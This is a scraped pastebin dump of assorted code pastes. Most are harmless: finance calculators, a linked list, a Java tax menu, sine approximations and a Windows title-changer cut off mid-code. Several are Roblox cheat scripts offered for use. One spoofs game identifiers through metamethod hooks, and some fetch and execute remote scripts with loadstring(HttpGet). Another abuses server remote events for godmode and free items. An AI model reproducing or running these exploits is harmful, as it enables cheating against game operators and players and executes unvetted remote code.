                -- Durchlaufen aller Dateien im Verzeichnis
                for _, file in ipairs(files) do
                    local filePath = fs.combine(directory, file)
                    local score = readNumberFromFile(filePath)
                    if score then
                        table.insert(scores, {name = file, score = score})
                    end
                end

                -- Funktion zum Sortieren der Scores
                local function compareScores(a, b)
                    return a.score > b.score
                end

                -- Sortieren der Scores
                table.sort(scores, compareScores)

                -- Ausgabe der Top 5 Spieler
                for i = 1, math.min(6, #scores) do
                    print(i .. "". "" .. scores[i].name .. "" - "" .. scores[i].score)
                end

                msg(01,19,16,01,""back"")                
                local event, button, X, Y = os.pullEvent(""mouse_click"") 
                if X >= 01 and X <= 04 and Y == 19 then                 --back button
                    os.reboot()
                end
            end    
        end
    end
end

function CheckPlayer()
    os.loadAPI(""ocs/apis/sensor"")
    local offset = {
        X = 1,
        Y = 1,
        Z = 0
    }

    local radius = 5

    function distance(pos)
        local xd = pos.X - offset.X
        local yd = pos.Y - offset.Y
        local zd = pos.Z - offset.Z
        return math.sqrt(xd*xd + yd*yd + zd*zd)
    end

    local proximity = sensor.wrap(""top"")

    while true do
        a = 0
        sleep(3)
        local targets = proximity.getTargets()
        for k, v in pairs(targets) do
            if distance(v.Position) < radius then
                a = 1 
            else 
                a = 0
            end
        end
        if a == 0 then
            os.reboot()
        end
    end
end

parallel.waitForAny(Main, CheckPlayer)"
BDUcjRMw,GoodwillV2,Gaming_Bear,Lua,Saturday 6th of July 2024 02:05:20 AM CDT,"local spoofvalue1, spoofvalue2 = game.PlaceId, game.GameId

local old; old = hookmetamethod(game, ""__index"", function(s, k)
    if s == game and k == ""PlaceId"" then
        return spoofvalue1
    elseif s == game and k == ""GameId"" then
        return spoofvalue2
    end
    return old(s, k)
end)

local old; old = hookmetamethod(game, ""__newindex"", function(s, k, v)
    if s == game and k == ""PlaceId"" then
        spoofvalue1 = v
        return
    elseif s == game and k == ""GameId"" then
        spoofvalue2 = v
        return
    end
    return old(s, k, v)
end)

game.PlaceId = 13438553315

loadstring(game:HttpGet(('https://raw.githubusercontent.com/Aidez/decaying_winter/main/GOODWILL_COMMAND_SCRIPT'),true))()"
zSvLFdmi,money after quitting job,nagito_123,C++,Saturday 6th of July 2024 01:31:17 AM CDT,"#include <bits/stdc++.h>
using namespace std;
using ll = long long;
using ld = long double;
#define sz(x) (int)(x).size()
#define all(x) x.begin(), x.end()
template<typename A, typename B> ostream& operator<<(ostream &os, const pair<A, B> &p) { return os << '(' << p.first << "", "" << p.second << ')'; }
template<typename T_container, typename T = typename enable_if<!is_same<T_container, string>::value, typename T_container::value_type>::type> ostream& operator<<(ostream &os, const T_container &v) { os << '{'; string sep; for (const T &x : v) os << sep << x, sep = "", ""; return os << '}'; }
void dbg_out() { cerr << endl; }
template<typename Head, typename... Tail> void dbg_out(Head H, Tail... T) { cerr << ' ' << H; dbg_out(T...); }
#ifdef LOCAL
#define io() freopen(""input.txt"", ""r"", stdin); freopen(""output.txt"", ""w"", stdout);
#define dbg(...) cerr << ""("" << #__VA_ARGS__ << ""):"", dbg_out(__VA_ARGS__)
#else
#define io() ios_base::sync_with_stdio(!cin.tie(0));
#define dbg(...)
#endif

const double initial_capital = 1.5, initial_expense = 0.127, tax_rate = 0.15, investment_rate = 0.2; // in Crores, adjust as needed
const int years = 17;

void solve() {
   double x = initial_capital, e = initial_expense;
   for (int i = 0; i < years; i++) {
      x -= e; // deduct expenses
      dbg(x, ""capital amount"", i + 1, ""year"");
      x += (1 - tax_rate) * investment_rate * x; // tax adjusted returns
      e += 0.07 * e; // account in inflation
   }
   cout << fixed << setprecision(2) << x << '\n';
}

// Finally, put x in a bank account with 7% interest,  will have enough money to survive for every single year of life, including every major or minor expense

int main() {
   io();
   int t = 1;
   cin >> t;
   while (t--) {
      solve ();
   }   
   return 0;
}"
UPsHatC9,money until quitting job,nagito_123,C++,Saturday 6th of July 2024 01:13:35 AM CDT,"#include <bits/stdc++.h>
using namespace std;
using ll = long long;
using ld = long double;
#define sz(x) (int)(x).size()
#define all(x) x.begin(), x.end()
template<typename A, typename B> ostream& operator<<(ostream &os, const pair<A, B> &p) { return os << '(' << p.first << "", "" << p.second << ')'; }
template<typename T_container, typename T = typename enable_if<!is_same<T_container, string>::value, typename T_container::value_type>::type> ostream& operator<<(ostream &os, const T_container &v) { os << '{'; string sep; for (const T &x : v) os << sep << x, sep = "", ""; return os << '}'; }
void dbg_out() { cerr << endl; }
template<typename Head, typename... Tail> void dbg_out(Head H, Tail... T) { cerr << ' ' << H; dbg_out(T...); }
#ifdef LOCAL
#define io() freopen(""input.txt"", ""r"", stdin); freopen(""output.txt"", ""w"", stdout);
#define dbg(...) cerr << ""("" << #__VA_ARGS__ << ""):"", dbg_out(__VA_ARGS__)
#else
#define io() ios_base::sync_with_stdio(!cin.tie(0));
#define dbg(...)
#endif

const double appraisal_rate = 0.15;
const double investment_rate = 0.13;
const double savings_rate = 0.07;
const double inflation_rate = 0.07;
const double tax_rate = 0.15;
const double investment_share = 0.75;
const double savings_share = 0.25;
const int years = 10;
const double initial_salary = 13.2;
const double initial_expenses = 6.5;

void solve() {
   double x = initial_salary, e = initial_expenses, in = 0, s = 0; // initial salary post taxes, expenses in lakhs
   for (int i = 0; i < years; i++) {
      double increment = appraisal_rate * x;
      dbg(x, e, i + 1, ""year"");
      double rem = x - e;
      in += rem * investment_share; 
      s += rem * savings_share;
      dbg(in, s, i + 1, ""year"");
      in += investment_rate * in * (1 - tax_rate); // investment growth
      s += savings_rate * s * (1 - tax_rate); // savings growth
      x += increment;  // salary increment
      e += inflation_rate * e; // inflation
   }
   cout << fixed << setprecision(2) << s + in << '\n';
}

// put savings plus investment in the capital amount, for next phase

int main() {
   io();
   int t = 1;
   cin >> t;
   while (t--) {
      solve ();
   }   
   return 0;
}"
BzSSejN5,Untitled,Berly12,Lua,Saturday 6th of July 2024 12:13:58 AM CDT,"--[[
	we êé†re trêèëv5 êèÉêé¢êé≤ êé†nd êé≠rk êèÉêé¢êé≤
]] 

--[[Tabs and Uilib]]--
local Library = loadstring(game:HttpGet(""https://raw.githubusercontent.com/Mapple7777/UI-Librarys/main/UI-1/UI.lua""))()

local main = Library:Create(""Berlyns"",""USSR "")
local PlayerW = main:Tab(""LocalPlayer"")

--[[Config]]--
Config = {
    Player = {
        InfJump = false
    },
}

game:GetService(""UserInputService"").JumpRequest:connect(function()
    if Config.Player.InfJump then
        game:GetService""Players"".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState(""Jumping"")
    end
end)


--// Fly script From Fat IY

 function getRoot(char)
    local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
    return rootPart
    end
    local Players = game:GetService(""Players"")
     local IYMouse = game:GetService(""Players"").LocalPlayer:GetMouse()
     FLYING = false
        QEfly = true
        iyflyspeed = 1
        vehicleflyspeed = 1
        function sFLY(vfly)
        repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
        repeat wait() until IYMouse
        if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
    
        local T = getRoot(Players.LocalPlayer.Character)
        local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
        local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
        local SPEED = 0
    
        local function FLY()
            FLYING = true
            local BG = Instance.new('BodyGyro')
            local BV = Instance.new('BodyVelocity')
            BG.P = 9e3
            BG.Parent = T
            BV.Parent = T
            BG.maxTorque = Vector3.new(9e4, 9e4, 9e4)
            BG.cframe = T.CFrame
            BV.velocity = Vector3.new(0, 0, 0)
            BV.maxForce = Vector3.new(9e4, 9e4, 9e4)
            task.spawn(function()
                repeat wait()
                    if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
                        Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
                    end
                    if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
                        SPEED = 50
                    elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
                        SPEED = 0
                    end
                    if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
                        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                        lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
                    elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
                        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
                    else
                        BV.velocity = Vector3.new(0, 0, 0)
                    end
                    BG.cframe = workspace.CurrentCamera.CoordinateFrame
                until not FLYING
                CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
                lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
                SPEED = 0
                BG:Destroy()
                BV:Destroy()
                if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
                    Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
                end
            end)
        end
        flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
            elseif KEY:lower() == 's' then
                CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
            elseif KEY:lower() == 'a' then
                CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
            elseif KEY:lower() == 'd' then 
                CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
            elseif QEfly and KEY:lower() == 'e' then
                CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
            elseif QEfly and KEY:lower() == 'q' then
                CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
            end
            pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
        end)
        flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
            if KEY:lower() == 'w' then
                CONTROL.F = 0
            elseif KEY:lower() == 's' then
                CONTROL.B = 0
            elseif KEY:lower() == 'a' then
                CONTROL.L = 0
            elseif KEY:lower() == 'd' then
                CONTROL.R = 0
            elseif KEY:lower() == 'e' then
                CONTROL.Q = 0
            elseif KEY:lower() == 'q' then
                CONTROL.E = 0
            end
        end)
        FLY()
     end
    
     function NOFLY()
        FLYING = false
        if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
        if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
            Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
        end
        pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
 end


--[[AutoFarm Tab]]--
AutoW:Toggle('AutoFarm Orbs',function(state)
    Config.AutoFarm.AutoOrbFarm = state
end)
AutoW:Toggle('AutoFarm Xp',function(state)
    Config.AutoFarm.AutoXpFarm = state
end)

AutoW :Toggle(""Auto evolve pet"",function(state)
    _G.Evolve = (state and true or false)
	wait()
	while _G.Evolve == true do
		wait()
		game.Replicatedstorage.rEvents.petEvolveEvent:FireServer(""evolvePet"", ""all"")
		end
		end)

AutoW:Button(""Spawn"",function()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-559.2, -7.45058e-08, 417.4))
end)

AutoW:Button(""Snow city"",function()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-858.358, 0.5, 2170.35))
end)

AutoW:Button(""Magma city"",function()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(1707.25, 0.550008, 4331.05))
end)

AutoW:Button(""Legends highway"",function()
    game.Players.LocalPlayer.Character:MoveTo(Vector3.new(3594.68, 214.804, 7274.56))
end)

AutoW:Toggle('Auto Hoops',function(state)
    Config.AutoFarm.AutoHoopFarm = state
end)

AutoW:Toggle('AutoFarm Gem',function(state)
    Config.AutoFarm.AutoGemFarm = state
end)

AutoW:Toggle('Auto Rebirth',function(state)
    Config.AutoFarm.AutoRebirth = state
end)

--[[LocalPlayer Tab]]--


PlayerW:Slider('Gravity',0,196.2,function(num)
    game.Workspace.Gravity = num
end)

PlayerW:Toggle('Inf Jump ',function(state)
    Config.Player.InfJump = state
end)

PlayerW:Slider('WalkSpeed Config',16,100000000000,function(num)
    game:GetService('Players').LocalPlayer.Character.Humanoid.WalkSpeed = num
end)

PlayerW:Slider('JumpPower Config',50,10000000,function(num)
    game:GetService('Players').LocalPlayer.Character.Humanoid.JumpPower = num
end)

PlayerW:Toggle('Fly',function(state)
    if state then 
        sFLY()
    else
        NOFLY()
    end
end)

PlayerW:Slider('Fly Config',1,15,function(Value)
    iyflyspeed = Value
end)"
ybPkHnsL,Untitled,35657,C++,Saturday 6th of July 2024 12:09:38 AM CDT,"#include <iostream>

using namespace std;


class ForwardList {
public:

    struct Node { //–æ–¥–Ω–æ—Å–≤—è–∑–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ —É–∑–ª–æ–≤
        int value; // —É–∑–µ–ª —Ö—Ä–∞–Ω–∏—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ç–∏–≤–Ω—É—é —á–∞—Å—Ç—å
        Node* next; // –∏ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å–ª–µ–¥—É—é—â–∏–π —É–∑–µ–ª –≤ —Å–ø–∏—Å–∫–µ
    };

    void push_front(const int& value) {
        head_ = new Node{ value, head_ };
        size_++;
    }

    void pop_front() {
        if (head_ != nullptr) {
            Node* temp = head_;
            head_ = head_->next;
            delete temp;
            size_--;
        }
    }

    void print() {
        Node* temp = head_;
        while (temp != nullptr) {
            cout << temp->value << "" "";
            temp = temp->next;
        }
        cout << endl;
    }

    int size() const {
        return size_;
    }

private:
    int size_ = 0;
    Node* head_ = nullptr;
};

int main() {

    ForwardList list1;

    for (int i = 0; i < 10; i++) {
        list1.push_front(i + 1);
    }
    list1.print();
    cout << list1.size() << endl;

    for (int i = 0; i < 3; i++) {
        list1.pop_front();
    }
    list1.print();
    cout << list1.size() << endl;
}"
qvVckGCi,Fiscal,LightProgrammer000,Java,Friday 5th of July 2024 09:58:42 PM CDT,"package modulo_3;

import java.text.NumberFormat;
import java.util.Locale;

public class EX09
{
    public static void main(String[] args) 
    {
        fiscal();
    }      

    private static void fiscal()
    {
        System.out.println(""*** CALCULOS FISCAIS ***"");
        
        switch (menu())
        {
            case 1:
                System.out.printf(""# Imposto: %s\n"", valorReal(imposto(receberSalario())));
                break;
            
            case 2:
                System.out.printf(""# Novo salario: %s\n"", valorReal(novoSalario(receberSalario())));
                break;
                
            case 3:
                System.out.printf(""# Classificacao: %s\n"", classificacao(receberSalario()));
                break;
                
            case 4:
                System.exit(0);
                break;

            default:
                break;    
        }
    }

    private static int menu()
    {
        int opc = 0;

        do
        {
            System.out.println(""\n#----- Menu -----#"");
            System.out.println(""[1] Imposto"");
            System.out.println(""[2] Novo Salario"");
            System.out.println(""[3] Classificacao"");
            System.out.println(""[4] Finalizar o programa"");
            System.out.print(""# Resp: "");

            try 
            {
                opc = Integer.parseInt(System.console().readLine());
            }

            catch (NumberFormatException e) 
            {
                System.out.println(""# Opcao Invalida !"");            
            }

        } while (opc < 1 || opc > 4);

        return opc;
    }
    
    // Funcao: Receber valor do salario
    private static double receberSalario()
    {
        System.out.print(""# Salario: "");
        double sal = Double.parseDouble(System.console().readLine());
        
        return sal;        
    }

    // Metodo: Calculo do imposto
    private static double imposto(double sal)
    {
        if (sal < 1000)
        {
            return sal * 5/100;                        
        }

        else if (sal >= 1000 && sal <= 3000)
        {
            return sal * 10/100;            
        }

        else
        {
            return sal * 15/100;
        }
    }

    // Metodo: Calculo do novo salario
    private static double novoSalario(double sal) 
    {
        if (sal > 4500)
        {
            return (sal + 45);             
        }

        else if (sal >= 2250 && sal <= 4500)
        {
            return (sal + 150);            
        }

        else if (sal >= 1350 && sal <= 2249.99)
        {
            return (sal + 225);            
        }

        else
        {
            return (sal + 300);                        
        }
    }

    // Metodo: Classificacao
    private static String classificacao(double sal)
    {
        if (sal <= 1500)
        {
            return ""Mal remunerado"";            
        }

        else
        {
            return ""Bem remunerado"";
        }    
    }
    
    // Funcao: Formatar valor
    private static String valorReal(double sal)
    {
        NumberFormat formatoBrasil = NumberFormat.getCurrencyInstance(new Locale(""pt"", ""BR""));

        // Formata o valor como moeda
        return formatoBrasil.format(sal);
    }
}
"
G4Qm9rsc,Creeper Survival Script (OVERPOWERED),2AreYouMental110,Lua,Friday 5th of July 2024 09:35:19 PM CDT,"getgenv().deletewhendupefound = true
local lib = loadstring(game:HttpGet(""https://pastebin.com/raw/A2Wf3WVh""))()
lib.makelib(""Exploiter Survival"")
local main = lib.maketab(""Main"")
local stats = lib.maketab(""Stats"")
local spambool = false

local stuffire = workspace:WaitForChild(""we"")
lib.makebutton(""Godmode (only for survivors)"",main,function()
    game:GetService(""Players"").LocalPlayer.Character.takedamage:FireServer(-math.random(100000,1000000000))
end)
local godmodebool = false
lib.maketoggle(""Auto Godmode (only for survivors)"",main,function(bool)
    godmodebool = bool
    while godmodebool do
        task.wait()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild(""takedamage"") and game.Players.LocalPlayer.Character:FindFirstChild(""Humanoid"") and game.Players.LocalPlayer.Character.Humanoid.Health <= 200 then
            game:GetService(""Players"").LocalPlayer.Character.takedamage:FireServer(-math.random(100000,1000000000))
        end
    end
end)
local selectedblock = ""obsidian""
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.TargetFilter = workspace.b
lib.makedropdown(""Block to spam"",main,{""wood"",""iron"",""glass"",""cobblestone"",""obsidian"",""glowstone"",""scaffolding""},function(thing)
    selectedblock = thing
end)
lib.maketoggle(""Spam Blocks"",main,function(bool)
    spambool = bool
    while spambool do
        task.wait()
        local build
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild(""Build"") then
            build = game:GetService(""Players"").LocalPlayer.Character.Build
        elseif game.Players.LocalPlayer.Backpack:FindFirstChild(""Build"") then
            build = game:GetService(""Players"").LocalPlayer.Backpack.Build
        end
        if build then
            build.RemoteEvent:FireServer(mouse.Hit.Position,Enum.NormalId.Top,workspace.map.grass,selectedblock)
        end
    end
end)
local ctrldown = false
local s1 = game:GetService(""UserInputService"").InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.LeftControl then
        ctrldown = true
    end
end)
local s2 = game:GetService(""UserInputService"").InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.LeftControl then
        ctrldown = false
    end
end)
lib.ondestroyedfunc = function()
    s1:Disconnect()
    s2:Disconnect()
    godmodebool = false
    spambool = false
end
lib.maketoggle(""Ctrl to Spam Blocks"",main,function(bool)
    spambool = bool
    while spambool do
        task.wait()
        if ctrldown then
            local build
            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild(""Build"") then
                build = game:GetService(""Players"").LocalPlayer.Character.Build
            elseif game.Players.LocalPlayer.Backpack:FindFirstChild(""Build"") then
                build = game:GetService(""Players"").LocalPlayer.Backpack.Build
            end
            if build then
                build.RemoteEvent:FireServer(mouse.Hit.Position,Enum.NormalId.Top,workspace.map.grass,selectedblock)
            end
        end
    end
end)
lib.maketextbox(""Size Weapon"",main,function(thing)
    thing = tonumber(thing)
    local handle = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA(""Tool"").Handle
    handle.Size = Vector3.new(thing/5,thing/5,thing)
    local outline = handle:FindFirstChildWhichIsA(""SelectionBox"") or Instance.new(""SelectionBox"")
    outline.Adornee = handle
    outline.Parent = handle
end)
lib.makedropdown(""Get Blocks"",stats,{""wood"",""iron"",""glass"",""stone"",""obsidian"",""glowstone"",""scaffolding""},function(thing)
    workspace:WaitForChild(""place""):FireServer(thing,6969)
end)
lib.makedropdown(""Get Accesories"",stats,{""None"",""Headband"",""Pan"",""Rocket hat"",""Helmet"",""Angel ring"",""Golden crown""},function(thing)
    stuffire:FireServer(thing,""accessory"",""ac"")
end)
lib.makedropdown(""Get Armor"",stats,{""leather armor"",""iron armor"",""gold armor"",""diamond armor"",""elytra""},function(thing)
    stuffire:FireServer(thing,""armor"",""a"")
end)
lib.makedropdown(""Get Tools"",stats,{""Teleport pearl"",""Bow"",""Torch"",""Shield"",""Apple"",""Golden apple"",""Iron golem"",""Speed potion"",""Jump potion"",""Strength Potion""},function(thing)
    stuffire:FireServer(thing,""tools"",""t"")
end)
lib.makedropdown(""Get Weapons"",stats,{""stone"",""iron"",""gold"",""diamond"",""ruby"",""sapphire"",""Obisidan hammer"",""Obsidian Neonblade""},function(thing)
    stuffire:FireServer(thing.."" sword"",""armor"",""a"")
end)
lib.makedropdown(""Get Creepers"",stats,{""normal"",""ice"",""lava"",""toxic"",""invisable"",""void"",""gold""},function(thing)
    stuffire:FireServer(thing,""creeper"",""c"")
end)
lib.makelabel(""stuff down below is buying it"",stats)
lib.makelabel(""you can still buy the items even at negative points"",stats)
local stuffire2 = workspace.wb
lib.makedropdown(""Get Armor"",stats,{""leather armor"",""iron armor"",""gold armor"",""diamond armor"",""elytra""},function(thing)
    stuffire2:FireServer(thing,0,""armor"",""armorstats"",thing)
end)
lib.makedropdown(""Get Tools"",stats,{""Teleport pearl"",""Bow"",""Torch"",""Shield"",""Apple"",""Golden apple"",""Iron golem"",""Speed potion"",""Jump potion"",""Strength Potion""},function(thing)
    stuffire2:FireServer(thing,0,""tools"",""Toolstats"",thing)
end)
lib.makedropdown(""Get Weapons"",stats,{""stone"",""iron"",""gold"",""diamond"",""ruby"",""sapphire"",""Obsidian hammer"",""Obsidian Neonblade""},function(thing)
    local args = {
        [1] = thing.."" sword"",
        [2] = 450,
        [3] = ""weapons"",
        [4] = ""weaponstats"",
        [5] = thing
    }
    stuffire2:FireServer(unpack(args))
end)
lib.makedropdown(""Get Creepers"",stats,{""normal"",""ice"",""lava"",""toxic"",""invisable"",""void"",""gold""},function(thing)
    stuffire2:FireServer(thing,0,""creepers"",""Creepersstats"",thing)
end)"
bStBN5vh,Sine approximations,Kaelygon,C,Friday 5th of July 2024 08:50:21 PM CDT,"
#include <stdint.h>
#include <stdio.h>

/*
	Sine approximation of 127.5*sin(pi*x/2^7)+127.5
	Based on quadratic (3x-x^3)/2 [0,0.25]
	Detailed functions: https://desmos.com/calculator/sqllbjao14
	Max error = ~1.8%. Identical to sine at 0,64,128,192,255
*/
uint8_t kaelAudio_sine(uint8_t n){
		uint8_t q = n>>6; //quarter phase 0b00=1st 0b01=2nd 0b10=3rd 0b11=4th   
		n = n&0b00111111; //repeat quarters
		n = q&0b01 ? 64-n : n; //mirror 2nd and 4th quarters by x-axis
		uint16_t p = (((uint16_t)n*n)>>6)+1; //calculate 6x-n^3/2^11 cube in two parts to prevent overflow //+1 compensates flooring
		p = 6*n - (((uint16_t)n*p)>>5);
		uint8_t o = (p>>1)+128; //scale and offset to match sine wave
		o = q&0b10 ? ~o : o; //mirror 3rd and 4th quarters by y-axis
		return o;
}

/*
	Sine approximation of sin(2pi*x/128)*128
	Based on parabola 2x-x^2 [0,0.5]
	Detailed functions: https://desmos.com/calculator/fuhb4xzejt
	max error 3.6%. Identical to sine at 0,64,128,192,255
*/
uint8_t kaelAudio_sineParabola(uint8_t phase){
	uint8_t secondHalf = phase & 0b10000000;
	phase <<= 1;
	uint16_t buf = ((uint16_t)(phase) << 1) - UINT8_MAX;
	phase = (uint8_t)((buf * buf) >> 9);
	phase = secondHalf ? phase : ~phase;
	return phase;
}

int main() {
	//printf(""print raw PCM unsigned 8-bit little endian"");
	//printf(""(3x-x^3)/2\n"");
	for(uint16_t i=0;i!=65535;i++){
		uint8_t o = kaelAudio_sine(i);
		fwrite(&o, sizeof(uint8_t), 1, stdout);
	}
	for(uint16_t i=0;i!=65535;i++){
		uint8_t o = kaelAudio_sineParabola(i);
		fwrite(&o, sizeof(uint8_t), 1, stdout);
	}
	//printf(""\n"");
	return 0;
}
"
xR63MySH,URL Stuff,jargon,JavaScript,Friday 5th of July 2024 08:23:22 PM CDT,"// Parse the current query string
const url = new URL(window.location.href);
const params = new URLSearchParams(url.search);

// Modify the query parameters (example: adding/updating a parameter)
params.set('key', 'value'); // Replace 'key' and 'value' with your desired key-value pair

// Write the modified query string back to the URL
url.search = params.toString();
window.history.replaceState({}, '', url);

// Now the URL in the browser's address bar is updated with the new query string
"
RnHuesuc,Advanced Title Changer (Now /w multiple process names & Persistent/ Single Hooking!),alien_fx_fiend,C++,Friday 5th of July 2024 07:25:03 PM CDT,"#include <Windows.h>
#include <string>
#include <TlHelp32.h>
#include <tchar.h>
#include <Psapi.h>
#include <iostream>
#include <vector>
#include <sstream>  // For std::wistringstream

#pragma comment(lib, ""Psapi.lib"")

struct ProcessInfo {
    std::wstring processName;
    HWND hwnd;
};

std::vector<ProcessInfo> targetProcesses;
std::vector<std::wstring> processNames;
bool running = true;

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        std::wcout << L""LookupPrivilegeValue error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        std::wcout << L""AdjustTokenPrivileges error: "" << GetLastError() << std::endl;
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::wcout << L""The token does not have the specified privilege. \n"" << std::endl;
        return FALSE;
    }

    return TRUE;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess != NULL) {
        TCHAR szProcessName[MAX_PATH] = TEXT(""<unknown>"");
        if (GetModuleFileNameEx(hProcess, NULL, szProcessName, MAX_PATH)) {
            std::wstring processName(szProcessName);
            size_t pos = processName.find_last_of(L""\\"");
            if (pos != std::wstring::npos) {
                processName = processName.substr(pos + 1);
            }
            CloseHandle(hProcess);

            TCHAR windowTitle[MAX_PATH];
            GetWindowText(hwnd, windowTitle, MAX_PATH);

            for (const auto& targetName : *(std::vector<std::wstring>*)lParam) {
                if (processName == targetName) {
                    targetProcesses.push_back({ processName, hwnd });
                }
            }
        }
        else {
            std::wcout << L""GetModuleFileNameEx error: "" << GetLastError() << std::endl;
        }
    }
    return TRUE;
}

bool ModifyWindowTitles(const std::wstring& newTitle) {
    bool anyModified = false;
    for (const auto& process : targetProcesses) {
        if (SetWindowText(process.hwnd, newTitle.c_str())) {
            anyModified = true;
            std::wcout << L""Modified window title of "" << process.processName << std::endl;
        }
        else {
            std::wcout << L""Failed to modify window title of "" << process.processName << std::endl;
        }
    }
    return anyModified;
}

DWORD WINAPI TitleModifierThread(LPVOID lpParam) {
    std::wstring newTitle = *(std::wstring*)lpParam;
    while (running) {
        ModifyWindowTitles(newTitle);
        Sleep(1000);
    }
    return 0;
}

std::vector<std::wstring> Split(const std::wstring& s, wchar_t delimiter) {
    std::vector<std::wstring> tokens;
    std::wstring token;
    std::wistringstream tokenStream(s); // std::wistringstream for wide strings
    while (std::getline(tokenStream, token, delimiter)) {
        tokens.push_back(token);
    }
    return tokens;
}

int main() {
    std::wstring input;
    std::wcout << L""Enter the process names separated by semicolons (e.g., notepad.exe;calc.exe): "";
    std::getline(std::wcin, input);
    processNames = Split(input, L';');

    std::wstring newTitle;
    std::wcout << L""Enter the new window title text: "";
    std::getline(std::wcin, newTitle);

    std::wstring persistence;
    std::wcout << L""Do you want persistence (Y/N)? "";
    std::getline(std::wcin, persistence);

    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::wcout << L""OpenProcessToken error: "" << GetLastError() << std::endl;
        return 1;
    }

    if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
        std::wcout << L""Failed to enable debug privilege."" << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    EnumWindows(EnumWindowsProc, (LPARAM)&processNames);

    if (targetProcesses.empty()) {
        std::wcout << L""No windows found for the specified processes."" << std::endl;
    }
    else {
        if (persistence == L""Y"" || persistence == L""y"") {
            HANDLE hThread = CreateThread(NULL, 0, TitleModifierThread, &newTitle, 0, NULL);
